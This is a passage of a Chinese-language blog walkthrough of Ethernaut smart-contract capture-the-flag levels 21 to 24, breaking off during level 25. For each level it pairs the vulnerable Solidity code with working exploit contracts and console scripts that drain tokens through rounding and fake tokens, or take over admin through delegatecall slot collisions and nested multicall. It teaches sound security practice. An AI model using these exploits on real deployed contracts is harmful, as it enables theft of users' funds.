_addr;</span><br><span class="line">target.call(abi.encodeWithSignature(&quot;setWithdrawPartner(address)&quot;,address(this)));</span><br><span class="line">&#125;</span><br><span class="line">fallback() external payable &#123;</span><br><span class="line">assert(false);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="21-Shop"><a href="#21-Shop" class="headerlink" title="21. Shop"></a>21. Shop</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  function price() external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price = 100;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  function buy() public &#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = true;</span><br><span class="line">      price = _buyer.price();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题要求以少于 100 的价格完成购买，<code>buy</code>函数内部的逻辑和第11题类似，但是这里的 price 变量用 <code>view</code>修饰，表示不能修改状态，即不能有以下操作：</p><ol><li>写状态变量</li><li>触发事件(emit events)</li><li>创建其他合约</li><li>使用<code>selfdestruct</code></li><li>通过<code>call</code>发送以太币</li><li>使用call调用任何没有被标记为<code>view</code>或者<code>pure</code>的函数</li><li>使用低级的<code>call</code></li><li>使用包含opcode的内联汇编</li></ol><p>所以不能使用状态变量标记<code>price</code>，但是这里可以利用<code>isSold</code>变量，当第一次调用<code>price</code>函数时， <code>isSold == false</code>，第二次调用时<code>isSold == true</code>，所以这里可以利用该通过<code>if</code>判断，通过部署攻击合约，利用攻击合约调用<code>buy</code>函数，通过<code>if</code>判断然后调用该合约中重写后的<code>price</code>方法，就会得到一个新的<code>price</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.7;</span><br><span class="line"></span><br><span class="line">interface IShop &#123;</span><br><span class="line">    function isSold() external view returns (bool);</span><br><span class="line">    function buy() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Buyer &#123;</span><br><span class="line">    address levelInstance;</span><br><span class="line"></span><br><span class="line">    constructor(address _levelInstance) &#123;</span><br><span class="line">        levelInstance = _levelInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() public view returns (uint256) &#123;</span><br><span class="line">        return IShop(msg.sender).isSold() ? 0 : 100;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy() public &#123;</span><br><span class="line">        IShop(levelInstance).buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="22-Dex"><a href="#22-Dex" class="headerlink" title="22. Dex"></a>22. Dex</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function addLiquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题定义了一个用来交换货币的合约，其中token1和token2都是<code>SwappableToken</code>类型的一种erc20代币，这两个的地址在初始化实例时就确定了。player初始拥有这两种代币的数量为10，而合约拥有数量为100，我们的最终目的是，将合约中某种代币的数量清0，也就是让合约拥有的token1或者token2代币的数量为0。</p><p><code>get_swap_price</code>函数内部使用了除法，合约中将返回值定义为<code>uint</code>类型，由于除法可能产生小数，小数转整型不可避免地存在精度缺失问题，导致了在交换过程中我们可以获取更多代币。</p><p>首先调用<code>approve</code>函数，方便转账</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.approve(player,<span class="number">1000</span>)</span><br><span class="line"><span class="keyword">await</span> contract.approve(contract.address,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>然后通过多次循环转账将拥有的代币全部交换。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Addr_token1 = (<span class="keyword">await</span> contract.token1())</span><br><span class="line">Addr_token2 = (<span class="keyword">await</span> contract.token2())</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一次交换</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token1,Addr_token2,<span class="number">10</span>)</span><br><span class="line"><span class="comment">//第二次交换</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token2,Addr_token1,<span class="number">20</span>)</span><br><span class="line"><span class="comment">//第三次交换</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token1,Addr_token2,<span class="number">24</span>)</span><br><span class="line"><span class="comment">//第四次交换</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token2,Addr_token1,<span class="number">30</span>)</span><br><span class="line"><span class="comment">//第五次交换</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token1,Addr_token2,<span class="number">41</span>)</span><br><span class="line"><span class="comment">//第六次交换，注意这里是45就正好，多了会超过最大值报错</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token2,Addr_token1,<span class="number">45</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="23-Dex2"><a href="#23-Dex2" class="headerlink" title="23. Dex2"></a>23. Dex2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract DexTwo is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function add_liquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapAmount(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableTokenTwo is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与<code>Dex</code>相比，<code>Dex2</code>去掉了<code>require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</code>，交换 token 还与<code>Dex</code>相同，同时，题目要求将合约中的两种 token 消耗完即可通过这道题目。</p><p>因此我们的思路是再写一个token，将合约中的 token 全部转移到我们创建的 token 中。</p><p>首先部署两个用来转移中间 token 的恶意合约，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Mytoken is ERC20 &#123;</span><br><span class="line">    address public target;</span><br><span class="line">  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在部署时<code>INITIALSUPPLY</code>设置为 200，部署完成后 approve 给题目地址 100 个token，并转给题目地址100个token，所以题目合约和恶意合约在初始状态下各拥有100个恶意合约的token。</p><p>然后执行以下代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.approve(player,<span class="number">1000</span>)</span><br><span class="line"><span class="keyword">await</span> contract.approve(contract.address,<span class="number">1000</span>)</span><br><span class="line">token1 = (<span class="keyword">await</span> contract.token1())</span><br><span class="line">token2 = (<span class="keyword">await</span> contract.token2())</span><br><span class="line"></span><br><span class="line"><span class="comment">// mytoken1和mytoken2分别对应2个部署的恶意合约的地址</span></span><br><span class="line">mytoken1 = <span class="string">&#x27;0x02c68949EB02dd68e2B16e9c415cd70A2343409F&#x27;</span></span><br><span class="line">mytoken2 = <span class="string">&#x27;0x14E246478B8Fcb00011bd5239cE2c4573a6acD3e&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(mytoken1,token1,<span class="number">100</span>)</span><br><span class="line"><span class="keyword">await</span> contract.swap(mytoken2,token2,<span class="number">100</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="24-Puzzle-Wallet"><a href="#24-Puzzle-Wallet" class="headerlink" title="24. Puzzle Wallet"></a>24. Puzzle Wallet</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/UpgradeableProxy-08.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PuzzleProxy is UpgradeableProxy &#123;</span><br><span class="line">    address public pendingAdmin;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123;</span><br><span class="line">        admin = _admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin &#123;</span><br><span class="line">      require(msg.sender == admin, &quot;Caller is not the admin&quot;);</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function proposeNewAdmin(address _newAdmin) external &#123;</span><br><span class="line">        pendingAdmin = _newAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;</span><br><span class="line">        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);</span><br><span class="line">        admin = pendingAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upgradeTo(address _newImplementation) external onlyAdmin &#123;</span><br><span class="line">        _upgradeTo(_newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PuzzleWallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public maxBalance;</span><br><span class="line">    mapping(address =&gt; bool) public whitelisted;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function init(uint256 _maxBalance) public &#123;</span><br><span class="line">        require(maxBalance == 0, &quot;Already initialized&quot;);</span><br><span class="line">        maxBalance = _maxBalance;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyWhitelisted &#123;</span><br><span class="line">        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">      maxBalance = _maxBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not the owner&quot;);</span><br><span class="line">        whitelisted[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);</span><br><span class="line">      balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender] -= value;</span><br><span class="line">        (bool success, ) = to.call&#123; value: value &#125;(data);</span><br><span class="line">        require(success, &quot;Execution failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        bool depositCalled = false;</span><br><span class="line">        for (uint256 i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            bytes memory _data = data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector := mload(add(_data, 32))</span><br><span class="line">            &#125;</span><br><span class="line">            if (selector == this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                // Protect against reusing msg.value</span><br><span class="line">                depositCalled = true;</span><br><span class="line">            &#125;</span><br><span class="line">            (bool success, ) = address(this).delegatecall(data[i]);</span><br><span class="line">            require(success, &quot;Error while delegating call&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目要求我们成为<code>PuzzleProxy</code>合约的 admin，<code>PuzzleProxy</code>合约继承了<code>UpgradeableProxy</code>，我们可以通过先执行<code>proposeNewAdmin</code>让自己的地址成为<code>pendingAdmin</code>，然后再执行<code>approveNewAdmin</code>来成为admin。但问题在于，<code>approveNewAdmin</code>有<code>onlyAdmin，所以需要对</code>onlyAdmin`进行绕过。</p><p>在控制台获取到的地址为<code>PuzzleWallet</code>合约。在该合约中，除了<code>addToWhitelist</code>函数，其他的都要求我们先把自己的地址加入whitelist才能调用，然而<code>addToWhitelist</code>又要求msg.sender必须等于owner，而 owner 又是<code>PuzzleProxy</code>合约的地址。分析到这里，这道题似乎无法下手。但是在题目中提示了<code>delegatecall</code>，首先画一下合约的内存结构图：</p><p><strong>PuzzlePorxy：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=============================================</span><br><span class="line"> unused (12 byte)  | pendingAdmin (20 bytes)         slot 0     </span><br><span class="line">=============================================</span><br><span class="line"> unused (12 bytes) | admin (20 bytes)                slot 1</span><br><span class="line">=============================================</span><br></pre></td></tr></table></figure><p><strong>PuzzleWallet:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=============================================</span><br><span class="line">unused (12 bytes)  |  owner (20 bytes)                slot 0</span><br><span class="line">=============================================</span><br><span class="line">           maxBalance(32 bytes)                       slot 1</span><br><span class="line">=============================================</span><br><span class="line">         whitelisted (32 bytes)                       slot 2</span><br><span class="line">=============================================</span><br><span class="line">balances (32 bytes)                       slot 3</span><br><span class="line">=============================================</span><br></pre></td></tr></table></figure><p>我们如果可以在<code>PuzzleWallet</code>合约中使用<code>delegatecall</code>调用<code>proposeNewAdmin</code>，就可以对 slot 0的内容进行修改，即修改owner，当owner修改为自己后就可以控制<code>PuzzleWallet</code>合约。</p><p>利用 etherJs 实例化合约调用<code>proposeNewAdmin</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="keyword">import</span>(<span class="string">&#x27;https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.js&#x27;</span>);</span><br><span class="line">ethers = _ethers;</span><br><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.providers.Web3Provider(<span class="built_in">window</span>.ethereum);</span><br><span class="line"><span class="keyword">const</span> signer = provider.getSigner();</span><br><span class="line"><span class="comment">//实例化合约</span></span><br><span class="line"><span class="keyword">const</span> contractEthers = <span class="keyword">new</span> ethers.Contract(instance, [<span class="string">&#x27;function proposeNewAdmin(address)&#x27;</span>], signer);</span><br><span class="line"><span class="comment">//调用proposeNewAdmin</span></span><br><span class="line"><span class="keyword">await</span> contractEthers.proposeNewAdmin(player);</span><br><span class="line"><span class="comment">//查看owner</span></span><br><span class="line"><span class="keyword">await</span> contract.owner()</span><br></pre></td></tr></table></figure><blockquote><p><strong>解释：为什么可以从PuzzleProxy 合约调用 proposeNewAdmin() 函数</strong></p><p>这两个合约使用逻辑合约的 ABI 创建了 Web3 合约对象，但使用代理合约的地址，即可以与逻辑合约进行交互。当用逻辑合约函数的数据调用代理合约时，由于该函数在代理中不存在，它的回退函数运行并通过<code>delegatecall</code>将调用重定向到逻辑合约。因此，控制台中的合约就是代理合约，如果要调用 proposeNewAdmin()，就需要调用控制台中的合约，但不可以使用在控制台定义的ABI中的函数，这里的ABI是逻辑ABI。</p></blockquote><p>在成为 owner 后调用<code>addToWhitelist</code>，将 player 添加到白名单中</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.addToWhitelist(player);</span><br><span class="line"><span class="keyword">await</span> contract.whitelisted(player);</span><br></pre></td></tr></table></figure><p><img src="/image/Ethernaut.assets/image-20230115185459052.png" alt="image-20230115185459052"></p><p>我们的最终目的是成为<code>PuzzleProxy</code>合约的owner，因此可以利用相同的漏洞在<code>PuzzleWallet</code>中使用 <code>delegatecall</code>修改<code>maxBalance</code>，由于在<code>init</code>函数中对 maxBalance 的值有限制，我们只能调用<code>setMaxBalance</code>函数，而要调用这个函数，就需要使合约中的余额清零。由合约代码可知，<code>execute</code>取款函数在取款时检查了我们的余额，我们只能取出自己存入的余额，而合约初始就有0.001ether，只靠这个函数是无法让合约余额清0的。需要使用<code>multicall</code>函数。</p><p><code>multicall</code>函数允许用户将多个调用一起处理以达到节省 gas 的目的，该函数通过一下代码检查是否是第一次调用<code>deposit</code>函数，通过判断目前执行的方法的函数选择器是否与deposit的函数选择器一致，因此我们只能调用一次<code>deposit</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (selector == this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                // Protect against reusing msg.value</span><br><span class="line">                depositCalled = true;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>但是<code>multicall</code>并不会检查自己，由于<code>multicall</code>可以执行任意代码，因此可以用<code>multicall</code>来包装<code>deposit</code>来绕过对函数选择器的检查，所以通过<code>multicall</code>调用<code>deposit</code>和<code>multicall(deposit)</code>，在实际只发送0.001 ether的情况下，合约实际的余额<code>balanace</code>为0.002 ether，此时<code>balances[player]</code>和合约余额数值相等，因此再执行一次<code>execute</code>全部提款即可。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> interface = <span class="keyword">new</span> ethers.utils.Interface([</span><br><span class="line">  <span class="string">&#x27;function deposit()&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;function multicall(bytes[])&#x27;</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二个参数是 multicall 的参数组，其中 multicall (bytes[]) 的第一个参数本身就是一个参数组。这就是为什么有两个参数。</span></span><br><span class="line"><span class="keyword">const</span> payload = interface.encodeFunctionData(<span class="string">&#x27;multicall&#x27;</span>, [[interface.getSighash(<span class="string">&#x27;deposit()&#x27;</span>)]]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* payload explanation:</span></span><br><span class="line"><span class="comment">0xac9650d8: 这是 multicall 的任数签名。后面有五个 32 字节的段（为方方便起见，提供了从头的偏移量（十六进制））</span></span><br><span class="line"><span class="comment">000: 0000000000000000000000000000000000000000000000000000000000000020</span></span><br><span class="line"><span class="comment">020: 0000000000000000000000000000000000000000000000000000000000000001</span></span><br><span class="line"><span class="comment">040: 0000000000000000000000000000000000000000000000000000000000000020</span></span><br><span class="line"><span class="comment">060: 0000000000000000000000000000000000000000000000000000000000000004</span></span><br><span class="line"><span class="comment">080: d0e30db000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">000: 由于 bytes[] 具有动态长度，因此该段指示指定位 bytes[] 数据的偏移量。</span></span><br><span class="line"><span class="comment">020: bytes[]是一个变长数组，所以这段表示数组的长度。</span></span><br><span class="line"><span class="comment">040: 数组中的数据（byte）也是动态的，因此该段包含确定字节数据的偏移量</span></span><br><span class="line"><span class="comment">060: bytes是一个变长数组，所以这一段表示数组的长度</span></span><br><span class="line"><span class="comment">080: 最后，实际数据。这是 deposit() 的 4 字节函数选择器</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将两个 multicall(deposit())作为参数传递为 multicall，发送的金额为 0.001 eth，此次交易将执行两次 deposit，将 balances 设置为 0.002 eth</span></span><br><span class="line"><span class="keyword">await</span> contract.multicall([payload, payload], &#123;<span class="attr">value</span>: toWei(<span class="string">&#x27;0.001&#x27;</span>)&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 execute 将合约中的余额消耗尽，这里的 data 不需要实际内容</span></span><br><span class="line"><span class="keyword">await</span> contract.execute(player, toWei(<span class="string">&#x27;0.002&#x27;</span>),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后利用相同的方法调用<code>await contract.setMaxBalance(player);</code>，修改<code>PuzzleProxy</code>合约中的 slot 1，即将 owner 修改为自己。</p><h3 id="25-Motorbike"><a href="#25-Motorbike" class="headerlink" title="25. Motorbike"></a>25. Motorbike</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity &lt;0.7.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Motorbike &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line">    </span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span><br><span class="line">    constructor(address _logic) public &#123;</span><br><span class="line">        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;</span><br><span class="line">        (bool success,) = _logic.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(&quot;initialize()&quot;)</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Delegates the current call to `implementation`.</span><br><span class="line">    function _delegate(address implementation) internal virtual &#123;</span><br><span class="line">        // solhint-disable-next-line no-inline-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            calldatacopy(0, 0, calldatasize())</span><br><span class="line">            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)</span><br><span class="line">            returndatacopy(0, 0, returndatasize())</span><br><span class="line">            switch result</span><br><span class="line">            case 0 &#123; revert(0, returndatasize()) &#125;</span><br><span class="line">            default &#123; return(0, returndatasize()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Fallback function that delegates calls to the address returned by `_implementation()`. </span><br><span class="line">    // Will run if no other function in the contract matches the call data</span><br><span class="line">    fallback () external payable virtual &#123;</span><br><span class="line">        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Returns an `AddressSlot` with member `value` located at `slot`.</span><br><span class="line">    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Engine is Initializable &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"></span><br><span class="line">    address public upgrader;</span><br><span class="line">    uint256 public horsePower;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize() external initializer &#123;</span><br><span class="line">        horsePower = 1000;</span><br><span class="line">        upgrader = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Upgrade the implementation of the proxy to `newImplementation`</span><br><span class="line">    // subsequently execute the function call</span><br><span class="line">    function upgradeToAndCall(address 